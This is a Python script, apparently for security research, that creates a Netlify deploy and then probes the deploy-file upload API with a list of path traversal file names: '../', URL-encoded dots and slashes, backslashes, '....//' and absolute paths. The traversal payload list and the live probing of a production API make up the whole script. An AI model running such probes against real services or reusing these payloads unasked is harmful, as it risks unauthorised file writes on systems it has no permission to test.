# -*- coding: utf-8 -*-
"""Netlify:deploy files PUT 路径穿越测试"""
import http.client, ssl, gzip, brotli, sys, json, io, zipfile, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import AUTH_HEADER

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()

def api(path, method='GET', body=None, raw_body=None, ctype='application/json'):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': AUTH_HEADER, 'Content-Type': ctype}
    payload = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

# 创建新 deploy(zip 方式,空内容)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('index.html', '<html>traversal test</html>')
zip_bytes = buf.getvalue()
s, raw = api('/api/v1/sites/%s/deploys' % SITE_ID, method='POST', raw_body=zip_bytes, ctype='application/zip')
d = json.loads(raw)
deploy_id = d.get('id')
print('deploy:', s, deploy_id, d.get('state'))

# 路径穿越测试
paths = [
    '../test.txt',
    '../../test.txt',
    '/abs/test.txt',
    'a/../b.txt',
    '..%2Ftest.txt',
    '%2e%2e/test.txt',
    'sub/../../test.txt',
    '..\\test.txt',
    '....//test.txt',
    'sub/..',
    'index.html/../test.txt',
]
for p in paths:
    pp = '/api/v1/deploys/%s/files/%s?size=5' % (deploy_id, urllib.parse.quote(p, safe=''))
    try:
        s, raw = api(pp, method='PUT', raw_body=b'trav!', ctype='application/octet-stream')
        print('%-28s %d %s' % (p, s, raw[:100].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-28s ERR %s' % (p, str(e)[:40]))
